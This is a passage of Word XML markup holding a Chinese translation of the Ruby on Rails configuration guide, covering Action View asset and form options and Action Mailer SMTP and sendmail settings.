      <w:tr w:rsidR="005A4264" w:rsidRPr="005A4264" w14:paraId="1D5FCBE5" w14:textId="77777777" w:rsidTr="005A4264">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="72E38485" w14:textId="77777777" w:rsidR="005A4264" w:rsidRPr="005A4264" w:rsidRDefault="005A4264" w:rsidP="005A4264">
            <w:pPr>
              <w:widowControl/>
              <w:jc w:val="left"/>
              <w:divId w:val="2121296914"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="005A4264">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>&lt;%= javascript_include_tag :prototype</w:t>
            </w:r>
            <w:r w:rsidRPr="005A4264">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="005A4264">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>%&gt;</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="7F1DC11E" w14:textId="77777777" w:rsidR="005A4264" w:rsidRPr="005A4264" w:rsidRDefault="005A4264" w:rsidP="005A4264">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="200"/>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config.action_view.stylesheet_expansions</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 跟 </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>javascript_expansions</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 的工作方式差不多，但没有默认的项。在这个哈希数组定义的所有键都可以在视图里像这样引用:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="4200"/>
      </w:tblGrid>
      <w:tr w:rsidR="005A4264" w:rsidRPr="005A4264" w14:paraId="4BE35CDA" w14:textId="77777777" w:rsidTr="005A4264">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="33868D31" w14:textId="77777777" w:rsidR="005A4264" w:rsidRPr="005A4264" w:rsidRDefault="005A4264" w:rsidP="005A4264">
            <w:pPr>
              <w:widowControl/>
              <w:jc w:val="left"/>
              <w:divId w:val="1379741262"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="005A4264">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>&lt;%= stylesheet_link_tag :special</w:t>
            </w:r>
            <w:r w:rsidRPr="005A4264">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="005A4264">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>%&gt;</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="6C6DFF0B" w14:textId="77777777" w:rsidR="005A4264" w:rsidRPr="005A4264" w:rsidRDefault="005A4264" w:rsidP="005A4264">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="20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config.action_view.cache_asset_ids</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 当启用缓存时，资源标签助手(helper)会进行几个高耗的文件系统调用(默认进行文件系统时间戳检查)。然而这样可以防止当服务器运行时修改任何资源文件。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="52DE3FC2" w14:textId="77777777" w:rsidR="005A4264" w:rsidRPr="005A4264" w:rsidRDefault="005A4264" w:rsidP="005A4264">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="20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cofnig.action_view.embed_authenticity_token_in_remote_forms</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 让你设置具有 </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>:remote =&gt; true</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 属性的表单中是否默认带有 </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>authenticity_token</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">。默认情况下这个值设置为 false , 这意味着远程表单里将不包含 </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>authenticity_token</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">，这对你局部缓存表单会很有用。运程表单将通过 </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>meta</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 标签获得真实性(认证), 所以嵌入是必要的，除非你支持没有 Javascript 的浏览器。在这种情况下，你可以投递 </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>:authenticity_token =&gt; true</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 作为表单参数或者将这个配置设置为 </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>true</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3340CB92" w14:textId="77777777" w:rsidR="005A4264" w:rsidRPr="005A4264" w:rsidRDefault="005A4264" w:rsidP="005A4264">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="20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config.action_view.prefix_partial_path_with_controller_namespace</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 用来指定控制器是否从模板的子目录中根据控制器的命名空间搜索 partial 模板。例如，考虑某个命名为 </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>Admin::PostsController</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 的控制器，它渲染这个模板:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="2280"/>
      </w:tblGrid>
      <w:tr w:rsidR="005A4264" w:rsidRPr="005A4264" w14:paraId="257471F1" w14:textId="77777777" w:rsidTr="005A4264">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="57CE6E90" w14:textId="77777777" w:rsidR="005A4264" w:rsidRPr="005A4264" w:rsidRDefault="005A4264" w:rsidP="005A4264">
            <w:pPr>
              <w:widowControl/>
              <w:jc w:val="left"/>
              <w:divId w:val="505941419"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="005A4264">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>&lt;%=</w:t>
            </w:r>
            <w:r w:rsidRPr="005A4264">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="005A4264">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>render @post</w:t>
            </w:r>
            <w:r w:rsidRPr="005A4264">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r w:rsidRPr="005A4264">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
              </w:rPr>
              <w:t>%&gt;</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="7F43E60A"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默认设置为 </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>true</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">, 这样就会使用位于 </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>/admin/posts/_post.erb</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 的局部视图。将其值设置为 </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>false</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 则会渲染 </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>/posts/_post.erb</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>，这和没有命名域的控制器的渲染动作是一样的。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6ADD1660"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3.10 配置 Action Mailer</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3EB04DBF"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config.action_mailer</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 有这么些可用的设置：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0CA36F62" w14:textId="77777777" w:rsidR="005A4264" w:rsidRPr="005A4264" w:rsidRDefault="005A4264" w:rsidP="005A4264">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="204"/>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config.action_mailer.logger</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 接受一个日志类，这个类要遵循 Log4r 或者 Ruby 默认日志类的接口。这个类会被用于记录来自 Action Mailer 的信息。设置为 </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>nil</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 关闭日志。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="74F4B1A7" w14:textId="77777777" w:rsidR="005A4264" w:rsidRPr="005A4264" w:rsidRDefault="005A4264" w:rsidP="005A4264">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="20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config.action_mailer.smtp_settings</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 允许详细配置 </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>:smtp</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 传送方法。它接受一个选项哈希数组，可以包括一下任何选项： </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6A505691" w14:textId="77777777" w:rsidR="005A4264" w:rsidRPr="005A4264" w:rsidRDefault="005A4264" w:rsidP="005A4264">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="20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:address</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> – 允许你使用远程的邮件服务器。只要改变默认设置的 “localhost” 值就可以了。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2715DF1B" w14:textId="77777777" w:rsidR="005A4264" w:rsidRPr="005A4264" w:rsidRDefault="005A4264" w:rsidP="005A4264">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="20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:port</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> – 万一你的邮件服务器不是运行在 25 端口的话，在这进行修改。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0D1CCDE7" w14:textId="77777777" w:rsidR="005A4264" w:rsidRPr="005A4264" w:rsidRDefault="005A4264" w:rsidP="005A4264">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="20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:domain</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> – 如果你需要指定一个 HELO 域名，在这里设置。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2513C826" w14:textId="77777777" w:rsidR="005A4264" w:rsidRPr="005A4264" w:rsidRDefault="005A4264" w:rsidP="005A4264">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="20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:user_name</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> – 如果你的邮件服务器需要认证，在这个设置里填入用户名。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="02F21A3F" w14:textId="77777777" w:rsidR="005A4264" w:rsidRPr="005A4264" w:rsidRDefault="005A4264" w:rsidP="005A4264">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="20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:password</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> – 如果你的邮件服务器需要认证，在这里设置密码。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1CE59E75" w14:textId="77777777" w:rsidR="005A4264" w:rsidRPr="005A4264" w:rsidRDefault="005A4264" w:rsidP="005A4264">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="20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:authentication</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 如果你的邮件服务器需要认证，你需要在这指定认证的类型。这是一个 symbol 值，可填入 </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>:plain</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>:login</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>:cram_md5</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 其中一个。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2FFCB17E" w14:textId="77777777" w:rsidR="005A4264" w:rsidRPr="005A4264" w:rsidRDefault="005A4264" w:rsidP="005A4264">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="20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config.action_mailer.sendmail_settings</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 允许详细配置 </w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>sendmail</w:t>
      </w:r>
      <w:r w:rsidRPr="005A4264">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 发送方法。它接受一个包含选项的哈希数组，包括以下任何选项： </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0C320817" w14:textId="77777777" w:rsidR="005A4264" w:rsidRPr="005A4264" w:rsidRDefault="005A4264" w:rsidP="005A4264">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="1"/>
